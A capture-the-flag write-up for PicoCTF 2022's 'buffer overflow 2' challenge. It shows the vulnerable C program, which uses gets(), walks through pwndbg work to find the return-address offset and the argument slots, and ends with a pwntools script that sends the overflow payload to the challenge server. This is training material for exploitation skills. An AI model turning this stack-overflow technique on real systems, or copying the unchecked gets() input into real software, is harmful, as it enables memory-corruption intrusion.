---

title: "PicoCTF - Buffer Overflow 2"
date: 2023-08-23T13:13:04+08:00
author: John Wu
description: "PicoCTF 2022's buffer overflow 2 writeup"
tags: ["CTFs","guides","tech", "pwn"]
ShowToc: true
draft: false

---

# PicoCTF 2022

This challenge was a step up from buffer overflow 1 because you also had to control function call arguments.
You pretty much only need to know everything from buffer overflow 1 and attach a little more logic, although it did take me another day to solve it.

## Given
Problem:
Control the return address and arguments This time you'll need to control the arguments to the function you return to! Can you get the flag from this program? You can view source here. And connect with it using nc saturn.picoctf.net 62583

Hints:
1. Try using GDB to print out the stack once you write to it.

`vuln`

```c
// vuln.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 100
#define FLAGSIZE 64

void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xCAFEF00D)
    return;
  if (arg2 != 0xF00DF00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

## Tools
- GDB/pwndbg
- python3
- pwntools
- System: Linux 6.4.11-arch2-1 #1 SMP PREEMPT_DYNAMIC x86_64 GNU/Linux

## Analysis
Looking through the source code, the most obvious thing is the `win` function.
This time, inside the win function there's a condition for controlling arg1 and arg2 though.
At first, I thought this meant controlling $edi and $esi, but later looking through the assembly I was wrong.
Again, the `win` function isn't called from `main` or `vuln`, so we have to overflow the EIP and get there.

*Future me* overflow the return pointer, not the eip.

Run the program in GDB: `gdb vuln`.
Find the `win` to use for later.

```
pwndbg> info function win
All functions matching regular expression "win":

Non-debugging symbols:
0x08049296  win
```

So note down that `win` is at 0x08049296.
Now we have to find the offset for the `vuln` function because it's using the `gets()` function with a buffer size.
`cyclic` from pwntools is available in pwndbg.
It basically creates a recognizable pattern that we can use to find where in the stack a 4 byte pattern exists.

[more resources](https://en.wikipedia.org/wiki/De_Bruijn_sequence), [and more](https://ir0nstone.gitbook.io/notes/types/stack/de-bruijn-sequences)

```
pwndbg> cyclic 300
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac
pwndbg> r
Starting program: /home/hyperboly/Downloads/bufover2/vuln 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".
Please enter your string: 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac

Program received signal SIGSEGV, Segmentation fault.
0x62616164 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────
*EAX  0x12d
*EBX  0x62616162 ('baab')
*ECX  0xf7e458a0 ◂— 0x0
 EDX  0x0
*EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0x0
*ESI  0x80493f0 (__libc_csu_init) ◂— endbr32 
*EBP  0x62616163 ('caab')
*ESP  0xffffd4e0 ◂— 'eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac'
*EIP  0x62616164 ('daab')
```

We know we can overflow the EIP, now to find the offset with cyclic lookup because "daab" is a unique pattern in the de-bruijn-sequence.

```
pwndbg> cyclic -l daab
Finding cyclic pattern of 4 bytes: b'daab' (hex: 0x64616162)
Found at offset 112
```

So the offset is at 112, we just have to append the hex of `win`'s address to 112 bytes and we get to `win`.
This isn't the end though, because we have to get `arg1` and `arg2` to match "0xcafef00d" and "0xf00df00d."
So lets check the assembly of `win`.

```asm
pwndbg> disassemble win
Dump of assembler code for function win:
   0x08049296 <+0>:	endbr32
   0x0804929a <+4>:	push   ebp
   0x0804929b <+5>:	mov    ebp,esp
   0x0804929d <+7>:	push   ebx
   0x0804929e <+8>:	sub    esp,0x54
   0x080492a1 <+11>:	call   0x80491d0 <__x86.get_pc_thunk.bx>
   0x080492a6 <+16>:	add    ebx,0x2d5a
   0x080492ac <+22>:	sub    esp,0x8
   0x080492af <+25>:	lea    eax,[ebx-0x1ff8]
   0x080492b5 <+31>:	push   eax
   0x080492b6 <+32>:	lea    eax,[ebx-0x1ff6]
   0x080492bc <+38>:	push   eax
   0x080492bd <+39>:	call   0x8049160 <fopen@plt>
   0x080492c2 <+44>:	add    esp,0x10
   0x080492c5 <+47>:	mov    DWORD PTR [ebp-0xc],eax
   0x080492c8 <+50>:	cmp    DWORD PTR [ebp-0xc],0x0
   0x080492cc <+54>:	jne    0x80492f8 <win+98>
   0x080492ce <+56>:	sub    esp,0x4
   0x080492d1 <+59>:	lea    eax,[ebx-0x1fed]
   0x080492d7 <+65>:	push   eax
   0x080492d8 <+66>:	lea    eax,[ebx-0x1fd8]
   0x080492de <+72>:	push   eax
   0x080492df <+73>:	lea    eax,[ebx-0x1fa3]
   0x080492e5 <+79>:	push   eax
   0x080492e6 <+80>:	call   0x80490e0 <printf@plt>
   0x080492eb <+85>:	add    esp,0x10
   0x080492ee <+88>:	sub    esp,0xc
   0x080492f1 <+91>:	push   0x0
   0x080492f3 <+93>:	call   0x8049130 <exit@plt>
   0x080492f8 <+98>:	sub    esp,0x4
   0x080492fb <+101>:	push   DWORD PTR [ebp-0xc]
   0x080492fe <+104>:	push   0x40
   0x08049300 <+106>:	lea    eax,[ebp-0x4c]
   0x08049303 <+109>:	push   eax
   0x08049304 <+110>:	call   0x8049100 <fgets@plt>
   0x08049309 <+115>:	add    esp,0x10
   0x0804930c <+118>:	cmp    DWORD PTR [ebp+0x8],0xcafef00d
   0x08049313 <+125>:	jne    0x804932f <win+153>
   0x08049315 <+127>:	cmp    DWORD PTR [ebp+0xc],0xf00df00d
   0x0804931c <+134>:	jne    0x8049332 <win+156>
   0x0804931e <+136>:	sub    esp,0xc
   0x08049321 <+139>:	lea    eax,[ebp-0x4c]
   0x08049324 <+142>:	push   eax
   0x08049325 <+143>:	call   0x80490e0 <printf@plt>
   0x0804932a <+148>:	add    esp,0x10
   0x0804932d <+151>:	jmp    0x8049333 <win+157>
   0x0804932f <+153>:	nop
   0x08049330 <+154>:	jmp    0x8049333 <win+157>
   0x08049332 <+156>:	nop
   0x08049333 <+157>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x08049336 <+160>:	leave
   0x08049337 <+161>:	ret
End of assembler dump.
```

Notice the lines `0x0804930c <+118>: cmp DWORD PTR [ebp+0x8],0xcafef00d` and `0x08049315 <+127>: cmp DWORD PTR [ebp+0xc],0xf00df00d`.
It seems to be looking for the value at $ebp+0x8 and $ebp+0xc, which means we need to overflow that too.
Let's see if the cyclic 300 pattern got there, and where the offset is.

```
pwndbg> x $ebp+0x8
0x6261616b:	<error: Cannot access memory at address 0x6261616b>
```

The `x` command is short for examine, and it examines the address at $ebp+0x8.
Since we didn't get to `win`, I guess that the `win` stack was deleted and the program exited, so let's reinitiate with an offset of 112.

```
pwndbg> r <<< $(echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x96\x92\x04\x08BBBBBBBBBBBBBBBBBBBBBBBBB")
Starting program: /home/hyperboly/Downloads/bufover2/vuln <<< $(echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x96\x92\x04\x08BBBBBBBBBBBBBBBBBBBBBBBBB")
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBB

Breakpoint 1, 0x0804929e in win ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────
*EAX  0x8e
*EBX  0x41414141 ('AAAA')
*ECX  0xf7e458a0 ◂— 0x0
 EDX  0x0
*EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0x0
*ESI  0x80493f0 (__libc_csu_init) ◂— endbr32 
*EBP  0xffffd4dc ◂— 'AAAABBBBBBBBBBBBBBBBBBBBBBBBB'
*ESP  0xffffd4d8 ◂— 'AAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBB'
*EIP  0x804929e (win+8) ◂— sub esp, 0x54
```

In this case, I just sent a few Bs in there because it was easier than copy pasting the cyclic.
I also made a breakpoint at `win` because otherwise it would've exited the program which would mess up the registers.
So let's see if $ebp+0x8 and $ebp+0xc has changed.

```
pwndbg> x/s $ebp+0x8
0xffffd4e4:	'B' <repeats 21 times>
pwndbg> x/s $ebp+0xc
0xffffd4e8:	'B' <repeats 17 times>
```

We've overflowed the addresses, which means we just have to find the offset of these.
Again, using a de-bruijn-sequence we can find the offset from win.

```
pwndbg> cyclic 112
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaab
pwndbg> cyclic 50
pwndbg> r <<< $(echo "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaab\x96\x92\x04\x08aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama")
pwndbg> x/s $ebp+0x8
0xffffd4e4:	"baaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama"
pwndbg> x/s $ebp+0xc
0xffffd4e8:	"caaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama"
pwndbg> cyclic -l baaa
Finding cyclic pattern of 4 bytes: b'baaa' (hex: 0x62616161)
Found at offset 4
pwndbg> cyclic -l caaa
Finding cyclic pattern of 4 bytes: b'caaa' (hex: 0x63616161)
Found at offset 8
```

Miraculously, they're only 4 bytes apart (right next to each other) and an offset of 4 from `win` (remember the breakpoint).
So all we have to do is send in 112 bytes, the address for win, a padding of 4 bytes, and then "0xcafef00d" and "0xf00df00d"

## Solve
```py
# solve.py
from pwn import *

p = remote('saturn.picoctf.net', 65381)

payload = b"A"*112 + p32(0x08049296) + b"A"*4 + \
    p32(0xcafef00d) + p32(0xf00df00d)

log.info(p.recvline())
p.sendline(payload)
log.info(p.recvall())

p.close()
```
